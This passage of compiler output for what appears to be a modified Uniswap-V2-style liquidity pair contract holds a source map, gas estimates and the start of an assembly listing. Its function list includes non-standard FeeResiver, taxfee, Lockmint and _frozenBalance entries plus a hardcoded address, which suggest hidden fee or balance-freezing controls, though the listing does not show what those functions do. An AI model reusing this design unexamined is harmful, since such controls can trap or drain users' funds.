;;;;2677:6;:16;;-1:-1:-1;;;;;2677:16:6;;;-1:-1:-1;;;;;;2677:16:6;;;;;;;2703:6;:16;;;;;;;;;;;;;;;2729:6;:16;2478:274::o;307:26:0:-;;;;:::o;3108:361::-;-1:-1:-1;;;;;3239:15:0;;3219:4;3239:15;;;:9;:15;;;;;;;;3255:10;3239:27;;;;;;;;-1:-1:-1;;3239:42:0;3235:171;;-1:-1:-1;;;;;3327:15:0;;;;;;:9;:15;;;;;;;;3343:10;3327:27;;;;;;;;:68;;3376:5;3327:68;:31;:68;:::i;:::-;-1:-1:-1;;;;;3297:15:0;;;;;;:9;:15;;;;;;;;3313:10;3297:27;;;;;;;:98;3235:171;3415:26;3425:4;3431:2;3435:5;3415:9;:26::i;:::-;-1:-1:-1;3458:4:0;3108:361;;;;;:::o;656:116::-;706:66;656:116;:::o;266:35::-;299:2;266:35;:::o;515:31::-;;;;:::o;459:49::-;;;;;;;;;;;;;:::o;934:32:6:-;;;;:::o;972:::-;;;;:::o;4905:1265::-;4954:14;1179:8;;1191:1;1179:13;1171:41;;;;;-1:-1:-1;;;1171:41:6;;;;;;;;;;;;-1:-1:-1;;;1171:41:6;;;;;;;;;;;;;;;1233:1;1222:8;:12;;;1233:1;5023:13;:11;:13::i;:::-;-1:-1:-1;5084:6:6;;5077:39;;;-1:-1:-1;;;5077:39:6;;5110:4;5077:39;;;;;;4980:56;;-1:-1:-1;4980:56:6;;-1:-1:-1;5061:13:6;;-1:-1:-1;;;;;5084:6:6;;;;5077:24;;:39;;;;;;;;;;;;;;5084:6;5077:39;;;5:2:-1;;;;30:1;27;20:12;5:2;5077:39:6;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;5077:39:6;;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;5077:39:6;5149:6;;5142:39;;;-1:-1:-1;;;5142:39:6;;5175:4;5142:39;;;;;;5077;;-1:-1:-1;5126:13:6;;-1:-1:-1;;;;;5149:6:6;;;;5142:24;;:39;;;;;5077;;5142;;;;;;;;5149:6;5142:39;;;5:2:-1;;;;30:1;27;20:12;5:2;5142:39:6;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;5142:39:6;;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;5142:39:6;;-1:-1:-1;5191:12:6;5206:23;:8;-1:-1:-1;;;;;5206:23:6;;;:12;:23;:::i;:::-;5191:38;-1:-1:-1;5239:12:6;5254:23;:8;-1:-1:-1;;;;;5254:23:6;;;:12;:23;:::i;:::-;5239:38;;5288:10;5301:30;5310:9;5321;5301:8;:30::i;:::-;5341:17;5361:11;5288:43;;-1:-1:-1;5464:17:6;5460:394;;5509:54;443:7;5509:31;5519:20;:7;5531;5519:20;:11;:20;:::i;:::-;5509:9;:31::i;:54::-;5497:66;;5577:36;5591:1;443:7;5577:5;:36::i;:::-;5460:394;;;5711:132;-1:-1:-1;;;;;5737:37:6;;:25;:7;5749:12;5737:25;:11;:25;:::i;:::-;:37;;;;;;-1:-1:-1;;;;;5792:37:6;;:25;:7;5804:12;5792:25;:11;:25;:::i;:::-;:37;;;;;;5711:8;:132::i;:::-;5699:144;;5460:394;5883:1;5871:9;:13;5863:64;;;;-1:-1:-1;;;5863:64:6;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;5937:20;5943:2;5947:9;5937:5;:20::i;:::-;5968:49;5976:8;5986;5996:9;6007;5968:7;:49::i;:::-;6031:5;6027:47;;;6065:8;;6046:28;;-1:-1:-1;;;;;6051:8:6;;;;-1:-1:-1;;;6065:8:6;;;6046:28;:18;:28;:::i;:::-;6038:5;:36;6027:47;6129:34;;;;;;;;;;;;;;6134:10;;6129:34;;;;;;;;-1:-1:-1;;1266:1:6;1255:8;:12;-1:-1:-1;4905:1265:6;;;-1:-1:-1;;;;;;4905:1265:6:o;339:44:0:-;;;;;;;;;;;;;:::o;1010:17:6:-;;;;:::o;778:41:0:-;;;;;;;;;;;;;:::o;7669:1429:6:-;7732:12;7746;1179:8;;1191:1;1179:13;1171:41;;;;;-1:-1:-1;;;1171:41:6;;;;;;;;;;;;-1:-1:-1;;;1171:41:6;;;;;;;;;;;;;;;1233:1;1222:8;:12;;;1233:1;7813:13;:11;:13::i;:::-;-1:-1:-1;7869:6:6;;7918;;7965:40;;;-1:-1:-1;;;7965:40:6;;7999:4;7965:40;;;;;;7770:56;;-1:-1:-1;7770:56:6;;-1:-1:-1;;;;;;7869:6:6;;;;7918;;;7851:15;;7869:6;;7965:25;;:40;;;;;;;;;;;;;;7869:6;7965:40;;;5:2:-1;;;;30:1;27;20:12;5:2;7965:40:6;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;7965:40:6;;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;7965:40:6;8031;;;-1:-1:-1;;;8031:40:6;;8065:4;8031:40;;;;;;7965;;-1:-1:-1;8015:13:6;;-1:-1:-1;;;;;8031:25:6;;;;;:40;;;;;7965;;8031;;;;;;;:25;:40;;;5:2:-1;;;;30:1;27;20:12;5:2;8031:40:6;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;8031:40:6;;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;8031:40:6;8116:4;8081:14;8098:24;;;:9;8031:40;8098:24;;;;;8031:40;;-1:-1:-1;8146:30:6;8155:9;8166;8146:8;:30::i;:::-;8186:17;8206:11;8133:43;;-1:-1:-1;8206:11:6;8315:23;:9;8329:8;8315:23;:13;:23;:::i;:::-;:38;;;;;;;-1:-1:-1;8447:12:6;8421:23;:9;8435:8;8421:23;:13;:23;:::i;:::-;:38;;;;;;8411:48;;8548:1;8538:7;:11;:26;;;;;8563:1;8553:7;:11;8538:26;8517:111;;;;-1:-1:-1;;;8517:111:6;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;8638:31;8652:4;8659:9;8638:5;:31::i;:::-;8679:35;8693:7;8702:2;8706:7;8679:13;:35::i;:::-;8724;8738:7;8747:2;8751:7;8724:13;:35::i;:::-;8780:40;;;-1:-1:-1;;;8780:40:6;;8814:4;8780:40;;;;;;-1:-1:-1;;;;;8780:25:6;;;;;:40;;;;;;;;;;;;;;:25;:40;;;5:2:-1;;;;30:1;27;20:12;5:2;8780:40:6;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;8780:40:6;;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;8780:40:6;8841;;;-1:-1:-1;;;8841:40:6;;8875:4;8841:40;;;;;;8780;;-1:-1:-1;;;;;;8841:25:6;;;;;:40;;;;;8780;;8841;;;;;;;;:25;:40;;;5:2:-1;;;;30:1;27;20:12;5:2;8841:40:6;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;8841:40:6;;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;8841:40:6;;-1:-1:-1;8892:49:6;8900:8;8841:40;8920:9;8931;8892:7;:49::i;:::-;8955:5;8951:47;;;8989:8;;8970:28;;-1:-1:-1;;;;;8975:8:6;;;;-1:-1:-1;;;8989:8:6;;;8970:28;:18;:28;:::i;:::-;8962:5;:36;8951:47;9053:38;;;;;;;;;;;;;;-1:-1:-1;;;;;9053:38:6;;;9058:10;;9053:38;;;;;;;;;;;1244:1;;;;;;;;;1266;1255:8;:12;;;;7669:1429;;;:::o;325:70::-;;;-1:-1:-1;;;;;325:70:6;;:::o;220:40:0:-;;;;;;;;;;;;;;-1:-1:-1;;;220:40:0;;;;:::o;2963:139::-;3026:4;3042:32;3052:10;3064:2;3068:5;3042:9;:32::i;402:48:6:-;443:7;402:48;:::o;17701:421::-;1179:8;;1191:1;1179:13;1171:41;;;;;-1:-1:-1;;;1171:41:6;;;;;;;;;;;;-1:-1:-1;;;1171:41:6;;;;;;;;;;;;;;;1233:1;1222:8;:12;17769:6;;17818;;17958:8;;17913:40;;;-1:-1:-1;;;17913:40:6;;17947:4;17913:40;;;;;;-1:-1:-1;;;;;17769:6:6;;;;17818;;;;17849:128;;17769:6;;17897:2;;17913:54;;-1:-1:-1;;;;;17958:8:6;;17769:6;;17913:25;;:40;;;;;;;;;;;;;;;17769:6;17913:40;;;5:2:-1;;;;30:1;27;20:12;5:2;17913:40:6;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;17913:40:6;;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;17913:40:6;;:54;:44;:54;:::i;:::-;17849:13;:128::i;:::-;18096:8;;18051:40;;;-1:-1:-1;;;18051:40:6;;18085:4;18051:40;;;;;;17987:128;;18014:7;;18035:2;;18051:54;;-1:-1:-1;;;18096:8:6;;-1:-1:-1;;;;;18096:8:6;;-1:-1:-1;;;;;18051:25:6;;;;;:40;;;;;;;;;;;;;;;:25;:40;;;5:2:-1;;;;30:1;27;20:12;17987:128:6;-1:-1:-1;;1266:1:6;1255:8;:12;-1:-1:-1;17701:421:6:o;559:22::-;;;-1:-1:-1;;;;;559:22:6;;:::o;614:21::-;;;-1:-1:-1;;;;;614:21:6;;:::o;3475:964:0:-;3688:15;3676:8;:27;;3668:56;;;;;-1:-1:-1;;;3668:56:0;;;;;;;;;;;;-1:-1:-1;;;3668:56:0;;;;;;;;;;;;;;;3836:16;;-1:-1:-1;;;;;4073:13:0;;;3734:14;4073:13;;;:6;:13;;;;;;;;:15;;;;;;;;;3901:243;;706:66;3901:243;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;26:21:-1;;;22:32;;;6:49;;3901:243:0;;;;;3870:292;;;;;;-1:-1:-1;;;3774:402:0;;;;;;;;;;;;;;;;;;;;;26:21:-1;;;22:32;;;6:49;;3774:402:0;;;;;;3751:435;;;;;;;;;4223:26;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;3734:14;;4073:15;4223:26;;;;;-1:-1:-1;;4223:26:0;;;;;;;;;;4073:15;4223:26;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;-1:-1;;4223:26:0;;-1:-1:-1;;4223:26:0;;;-1:-1:-1;;;;;;;4280:30:0;;;;;;:59;;;4334:5;-1:-1:-1;;;;;4314:25:0;:16;-1:-1:-1;;;;;4314:25:0;;4280:59;4259:132;;;;;-1:-1:-1;;;4259:132:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;4401:31;4410:5;4417:7;4426:5;4401:8;:31::i;:::-;3475:964;;;;;;;;;:::o;6279:1281:6:-;6332:14;1179:8;;1191:1;1179:13;1171:41;;;;;-1:-1:-1;;;1171:41:6;;;;;;;;;;;;-1:-1:-1;;;1171:41:6;;;;;;;;;;;;;;;1233:1;1222:8;:12;;;1233:1;6401:13;:11;:13::i;:::-;-1:-1:-1;6462:6:6;;6455:39;;;-1:-1:-1;;;6455:39:6;;6488:4;6455:39;;;;;;6358:56;;-1:-1:-1;6358:56:6;;-1:-1:-1;6439:13:6;;-1:-1:-1;;;;;6462:6:6;;;;6455:24;;:39;;;;;;;;;;;;;;6462:6;6455:39;;;5:2:-1;;;;30:1;27;20:12;5:2;6455:39:6;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;6455:39:6;;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;6455:39:6;6527:6;;6520:39;;;-1:-1:-1;;;6520:39:6;;6553:4;6520:39;;;;;;6455;;-1:-1:-1;6504:13:6;;-1:-1:-1;;;;;6527:6:6;;;;6520:24;;:39;;;;;6455;;6520;;;;;;;;6527:6;6520:39;;;5:2:-1;;;;30:1;27;20:12;5:2;6520:39:6;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;6520:39:6;;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;6520:39:6;;-1:-1:-1;6569:12:6;6584:23;:8;-1:-1:-1;;;;;6584:23:6;;;:12;:23;:::i;:::-;6569:38;-1:-1:-1;6617:12:6;6632:23;:8;-1:-1:-1;;;;;6632:23:6;;;:12;:23;:::i;:::-;6617:38;;6666:10;6679:30;6688:9;6699;6679:8;:30::i;:::-;6719:17;6739:11;6666:43;;-1:-1:-1;6842:17:6;6838:399;;6887:54;443:7;6887:31;6897:20;:7;6909;6897:20;:11;:20;:::i;6887:54::-;6875:66;;6955:41;6974:1;443:7;6955:10;:41::i;:::-;;6838:399;;;7094:132;-1:-1:-1;;;;;7120:37:6;;:25;:7;7132:12;7120:25;:11;:25;:::i;7094:132::-;7082:144;;6838:399;7266:1;7254:9;:13;7246:66;;;;-1:-1:-1;;;7246:66:6;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;7322:25;7333:2;7337:9;7322:10;:25::i;:::-;;7358:49;7366:8;7376;7386:9;7397;7358:7;:49::i;389:64:0:-;;;;;;;;;;;;;;;;;;;;;;;;:::o;641:18:6:-;;;;:::o;18168:214::-;1179:8;;1191:1;1179:13;1171:41;;;;;-1:-1:-1;;;1171:41:6;;;;;;;;;;;;-1:-1:-1;;;1171:41:6;;;;;;;;;;;;;;;1233:1;1222:8;:12;18236:6;;18229:39;;;-1:-1:-1;;;18229:39:6;;18262:4;18229:39;;;;;;18208:167;;-1:-1:-1;;;;;18236:6:6;;18229:24;;:39;;;;;;;;;;;;;;18236:6;18229:39;;;5:2:-1;;;;30:1;27;20:12;5:2;18229:39:6;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;18229:39:6;;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;18229:39:6;18289:6;;18282:39;;;-1:-1:-1;;;18282:39:6;;18315:4;18282:39;;;;;;-1:-1:-1;;;;;18289:6:6;;;;18282:24;;:39;;;;;18229;;18282;;;;;;;;18289:6;18282:39;;;5:2:-1;;;;30:1;27;20:12;5:2;18282:39:6;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;18282:39:6;;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;18282:39:6;18335:8;;-1:-1:-1;;;;;18335:8:6;;;;-1:-1:-1;;;18357:8:6;;;18208:7;:167::i;:::-;1266:1;1255:8;:12;18168:214::o;1587:338::-;516:34;;;;;;;;;;;;;;;;;1727:43;;-1:-1:-1;;;;;1727:43:6;;;;;;;;;;;;;;;;26:21:-1;;;22:32;;;6:49;;1727:43:6;;;;;;25:18:-1;;;61:17;;-1:-1;;;;;182:15;-1:-1;;;179:29;160:49;;1703:77:6;;;;1668:12;;1682:17;;1703:10;;;1727:43;1703:77;;;25:18:-1;1703:77:6;;25:18:-1;36:153;66:2;61:3;58:11;36:153;;176:10;;164:23;;-1:-1;;139:12;;;;98:2;89:12;;;;114;36:153;;;274:1;267:3;263:2;259:12;254:3;250:22;246:30;315:4;311:9;305:3;299:10;295:26;356:4;350:3;344:10;340:21;389:7;380;377:20;372:3;365:33;3:399;;;1703:77:6;;;;;;;;;;;;;;;;;;;;;;;;14:1:-1;21;16:31;;;;75:4;69:11;64:16;;144:4;140:9;133:4;115:16;111:27;107:43;104:1;100:51;94:4;87:65;169:16;166:1;159:27;225:16;222:1;215:4;212:1;208:12;193:49;7:242;;16:31;36:4;31:9;;7:242;;1667:113:6;;;;1811:7;:57;;;;-1:-1:-1;1823:11:6;;:16;;:44;;;1854:4;1843:24;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;1843:24:6;1823:44;1790:128;;;;;-1:-1:-1;;;1790:128:6;;;;;;;;;;;;;;;;;;;;;;;;;;;;1587:338;;;;;:::o;481:149:7:-;539:9;568:6;;;:30;;-1:-1:-1;;583:5:7;;;597:1;592;583:5;592:1;578:15;;;;;:20;568:30;560:63;;;;;-1:-1:-1;;;560:63:7;;;;;;;;;;;;-1:-1:-1;;;560:63:7;;;;;;;;;;;;;;339:136;431:5;;;426:16;;;;418:50;;;;;-1:-1:-1;;;418:50:7;;;;;;;;;;;;-1:-1:-1;;;418:50:7;;;;;;;;;;;;;;2834:983:6;-1:-1:-1;;;;;2996:23:6;;;;;:50;;-1:-1:-1;;;;;;3023:23:6;;;2996:50;2975:114;;;;;-1:-1:-1;;;2975:114:6;;;;;;;;;;;;-1:-1:-1;;;2975:114:6;;;;;;;;;;;;;;;3204:18;;3130:25;:15;:25;;;-1:-1:-1;;;3204:18:6;;;;3187:35;;;3259:15;;;;;;:33;;-1:-1:-1;;;;;;3278:14:6;;;;3259:33;:51;;;;-1:-1:-1;;;;;;3296:14:6;;;;3259:51;3255:396;;;3495:11;3426:80;;3431:44;3465:9;3431:27;3448:9;3431:16;:27::i;:::-;-1:-1:-1;;;;;3431:33:6;;:44;:33;:44;:::i;:::-;3386:20;:120;;-1:-1:-1;;;;;3426:50:6;;;;:80;;;;3386:120;;;3560:80;;;3565:44;3599:9;3565:27;3582:9;3565:16;:27::i;:44::-;3520:20;:120;;-1:-1:-1;;;;;3560:50:6;;;;:80;;;;3520:120;;;3255:396;3660:8;:28;;-1:-1:-1;;3660:28:6;-1:-1:-1;;;;;3660:28:6;;;;;;;-1:-1:-1;;;;3698:28:6;-1:-1:-1;;;3698:28:6;;;;;;;;;-1:-1:-1;;;;;3736:35:6;-1:-1:-1;;;3736:35:6;;;;;;;;;3786:24;;;3791:8;;;3786:24;;3801:8;;;;;;;3786:24;;;;;;;;;;;;;;;;;2834:983;;;;;;:::o;2410:169:0:-;-1:-1:-1;;;;;2493:16:0;;;;;;;:9;:16;;;;;;;;:25;;;;;;;;;;;;;:33;;;2541:31;;;;;;;;;;;;;;;;;2410:169;;;:::o;2585:219::-;-1:-1:-1;;;;;2681:15:0;;;;;;:9;:15;;;;;;:26;;2701:5;2681:26;:19;:26;:::i;:::-;-1:-1:-1;;;;;2663:15:0;;;;;;;:9;:15;;;;;;:44;;;;2733:13;;;;;;;:24;;2751:5;2733:24;:17;:24;:::i;:::-;-1:-1:-1;;;;;2717:13:0;;;;;;;:9;:13;;;;;;;;;:40;;;;2772:25;;;;;;;2717:13;;2772:25;;;;-1:-1:-1;;;;;;;;;;;2772:25:0;;;;;;;;2585:219;;;:::o;3903:893:6:-;3998:10;4020:13;4045:7;;;;;;;;;-1:-1:-1;;;;;4045:7:6;-1:-1:-1;;;;;4036:23:6;;:25;;;;;;;;;;;;;;;;;;;;;;8:9:-1;5:2;;;30:1;27;20:12;5:2;4036:25:6;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;4036:25:6;;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;4036:25:6;4122:5;;-1:-1:-1;;;;;4079:19:6;;;;;;-1:-1:-1;4036:25:6;;-1:-1:-1;4122:5:6;4152:638;;4181:11;;4177:546;;4212:10;4225:41;4235:30;-1:-1:-1;;;;;4235:15:6;;;;:30;;;:19;:30;:::i;4225:41::-;4212:54;;4284:14;4301:17;4311:6;4301:9;:17::i;:::-;4284:34;;4348:9;4340:5;:17;4336:373;;;4381:14;4398:90;4465:1;4398:37;4414:20;:5;4424:9;4414:20;:9;:20;:::i;:::-;4398:11;;;:37;:15;:37;:::i;:90::-;4381:107;-1:-1:-1;4510:16:6;4529:35;4547:16;:9;4561:1;4547:16;:13;:16;:::i;:::-;4529:13;:5;4539:2;4529:13;:9;:13;:::i;:::-;:17;:35;:17;:35;:::i;:::-;4510:54;;4586:14;4615:11;4603:9;:23;;;;;;;-1:-1:-1;4652:13:6;;4648:42;;4667:23;4673:5;4680:9;4667:5;:23::i;:::-;4336:373;;;;4177:546;;;4152:638;;;4743:11;;4739:51;;4778:1;4770:5;:9;4739:51;3903:893;;;;;;:::o;352:301:5:-;400:9;429:1;425;:5;421:226;;;-1:-1:-1;450:1:5;485;481;477:5;;:9;500:89;511:1;507;:5;500:89;;;536:1;532:5;;573:1;568;564;560;:5;;;;;;:9;559:15;;;;;;555:19;;500:89;;;421:226;;;;609:6;;605:42;;-1:-1:-1;635:1:5;605:42;352:301;;;:::o;1508:200:0:-;1583:11;;:22;;1599:5;1583:22;:15;:22;:::i;:::-;1569:11;:36;;;-1:-1:-1;;;;;1631:13:0;;;;:9;:13;;;;;;:24;;1649:5;1631:24;:17;:24;:::i;:::-;-1:-1:-1;;;;;1615:13:0;;;;;;:9;:13;;;;;;;;:40;;;;1670:31;;;;;;;1615:13;;;;-1:-1:-1;;;;;;;;;;;1670:31:0;;;;;;;;;1508:200;;:::o;134:103:5:-;192:9;221:1;217;:5;:13;;229:1;217:13;;;225:1;217:13;213:17;134:103;-1:-1:-1;;;134:103:5:o;2196:208:0:-;-1:-1:-1;;;;;2277:15:0;;;;;;:9;:15;;;;;;:26;;2297:5;2277:26;:19;:26;:::i;:::-;-1:-1:-1;;;;;2259:15:0;;;;;;:9;:15;;;;;:44;;;;2327:11;:22;;2343:5;2327:22;:15;:22;:::i;:::-;2313:11;:36;;;2364:33;;;;;;;;-1:-1:-1;;;;;2364:33:0;;;-1:-1:-1;;;;;;;;;;;2364:33:0;;;;;;;;;2196:208;;:::o;1714:476::-;1807:4;-1:-1:-1;;;;;1869:21:0;;1861:65;;;;;-1:-1:-1;;;1861:65:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;2016:11;;:23;;2032:6;2016:23;:15;:23;:::i;:::-;2002:11;:37;;;-1:-1:-1;;;;;2075:23:0;;;;:14;:23;;;;;;:35;;2103:6;2075:35;:27;:35;:::i;:::-;-1:-1:-1;;;;;2049:23:0;;;;;;:14;:23;;;;;;;;:61;;;;2125:37;;;;;;;2049:23;;;;-1:-1:-1;;;;;;;;;;;2125:37:0;;;;;;;;;-1:-1:-1;2179:4:0;1714:476;;;;:::o;321:118:8:-;-1:-1:-1;;;;;396:10:8;-1:-1:-1;;;396:17:8;;321:118::o;507:106::-;567:9;-1:-1:-1;;;;;596:10:8;;-1:-1:-1;;;;;592:14:8;;596:10;592:14;;;;;;507:106;-1:-1:-1;;;507:106:8:o;198:135:7:-;290:5;;;285:16;;;;277:49;;;;;-1:-1:-1;;;277:49:7;;;;;;;;;;;;-1:-1:-1;;;277:49:7;;;;;;;;;;;;;"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "1992400",
								"executionCost": "infinite",
								"totalCost": "infinite"
							},
							"external": {
								"DOMAIN_SEPARATOR()": "1110",
								"FeeResiver()": "1082",
								"Lockmint(address)": "infinite",
								"MINIMUM_LIQUIDITY()": "309",
								"PERMIT_TYPEHASH()": "266",
								"_frozenBalance(address)": "1169",
								"allowance(address,address)": "1283",
								"approve(address,uint256)": "22366",
								"balanceOf(address)": "1170",
								"burn(address)": "infinite",
								"decimals()": "297",
								"factory()": "1104",
								"getReserves()": "1240",
								"initialize(address,address,uint256)": "62887",
								"kLast()": "1066",
								"mint(address)": "infinite",
								"name()": "infinite",
								"nonces(address)": "1214",
								"permit(address,address,uint256,uint256,uint8,bytes32,bytes32)": "infinite",
								"price0CumulativeLast()": "1065",
								"price1CumulativeLast()": "1087",
								"skim(address)": "infinite",
								"swap(uint256,uint256,address,bytes)": "infinite",
								"symbol()": "infinite",
								"sync()": "infinite",
								"taxfee()": "1086",
								"token0()": "1105",
								"token1()": "1126",
								"totalSupply()": "1110",
								"transfer(address,uint256)": "infinite",
								"transferFrom(address,address,uint256)": "infinite"
							},
							"internal": {
								"_mintFee(uint112,uint112)": "infinite",
								"_safeTransfer(address,address,uint256)": "infinite",
								"_update(uint256,uint256,uint112,uint112)": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 226,
									"end": 18384,
									"name": "PUSH",
									"value": "80"
								},
								{
									"begin": 226,
									"end": 18384,
									"name": "PUSH",
									"value": "40"
								},
								{
									"begin": 226,
									"end": 18384,
									"name": "MSTORE"
								},
								{
									"begin": 325,
									"end": 395,
									"name": "PUSH",
									"value": "6"
								},
								{
									"begin": 325,
									"end": 395,
									"name": "DUP1"
								},
								{
									"begin": 325,
									"end": 395,
									"name": "SLOAD"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"value": "1"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"value": "1"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"value": "A0"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "SHL"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "SUB"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "NOT"
								},
								{
									"begin": 325,
									"end": 395,
									"name": "AND"
								},
								{
									"begin": 353,
									"end": 395,
									"name": "PUSH",
									"value": "9E94EE69F3CDCD5E74E05563736E4679DA6DB44C"
								},
								{
									"begin": 325,
									"end": 395,
									"name": "OR"
								},
								{
									"begin": 325,
									"end": 395,
									"name": "SWAP1"
								},
								{
									"begin": 325,
									"end": 395,
									"name": "SSTORE"
								},
								{
									"begin": 325,
									"end": 395,
									"name": "PUSH",
									"value": "1"
								},
								{
									"begin": 1114,
									"end": 1139,
									"name": "PUSH",
									"value": "F"
								},
								{
									"begin": 1114,
									"end": 1139,
									"name": "SSTORE"
								},
								{
									"begin": 2358,
									"end": 2416,
									"name": "CALLVALUE"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "DUP1"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "ISZERO"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "PUSH [tag]",
									"value": "1"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "JUMPI"
								},
								{
									"begin": 30,
									"end": 31,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 27,
									"end": 28,
									"name": "DUP1"
								},
								{
									"begin": 20,
									"end": 32,
									"name": "REVERT"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "tag",
									"value": "1"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "JUMPDEST"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "POP"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "PUSH",
									"value": "40"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "MLOAD"
								},
								{
									"begin": 1107,
									"end": 1114,
									"name": "CHAINID"
								},
								{
									"begin": 1107,
									"end": 1114,
									"name": "SWAP1"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "DUP1"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "PUSH",
									"value": "52"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "PUSH data",
									"value": "8B73C3C69BB8FE3D512ECC4CF759CC79239F7B179B0FFACAA9A75D522B39400F"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "DUP3"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "CODECOPY"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "PUSH",
									"value": "40"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "DUP1"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "MLOAD"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "SWAP2"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "DUP3"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "SWAP1"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "SUB"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "PUSH",
									"value": "52"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "ADD"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "DUP3"
								},
								{
									"begin": 1203,
									"end": 1336,
									"name": "KECCAK256"
								},
								{
									"begin": 1370,
									"end": 1374,
									"name": "DUP3"
								},
								{
									"begin": 1370,
									"end": 1374,
									"name": "DUP3"
								},
								{
									"begin": 1370,
									"end": 1374,
									"name": "ADD"
								},
								{
									"begin": 1370,
									"end": 1374,
									"name": "DUP3"
								},
								{
									"begin": 1370,
									"end": 1374,
									"name": "MSTORE"
								},
								{
									"begin": 1370,
									"end": 1374,
									"name": "PUSH",
									"value": "7"
								},
								{
									"begin": 1370,
									"end": 1374,
									"name": "DUP1"
								},
								{
									"begin": 1370,
									"end": 1374,
									"name": "DUP5"
								},
								{
									"begin": 1370,
									"end": 1374,
									"name": "MSTORE"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"value": "4B4243204C5073"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"value": "C8"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "SHL"
								},
								{
									"begin": 1370,
									"end": 1374,
									"name": "PUSH",
									"value": "20"
								},
								{
									"begin": 1370,
									"end": 1374,
									"name": "SWAP5"
								},
								{
									"begin": 1370,
									"end": 1374,
									"name": "DUP6"
								},
								{
									"begin": 1370,
									"end": 1374,
									"name": "ADD"
								},
								{
									"begin": 1370,
									"end": 1374,
									"name": "MSTORE"
								},
								{
									"begin": 1404,
									"end": 1414,
									"name": "DUP3"
								},
								{
									"begin": 1404,
									"end": 1414,
									"name": "MLOAD"
								},
								{
									"begin": 1404,
									"end": 1414,
									"name": "DUP1"
								},
								{
									"begin": 1404,
									"end": 1414,
									"name": "DUP5"
								},
								{
									"begin": 1404,
									"end": 1414,
									"name": "ADD"
								},
								{
									"begin": 1404,
									"end": 1414,
									"name": "DUP5"
								},
								{
									"begin": 1404,
									"end": 1414,
									"name": "MSTORE"
								},
								{
									"begin": 1404,
									"end": 1414,
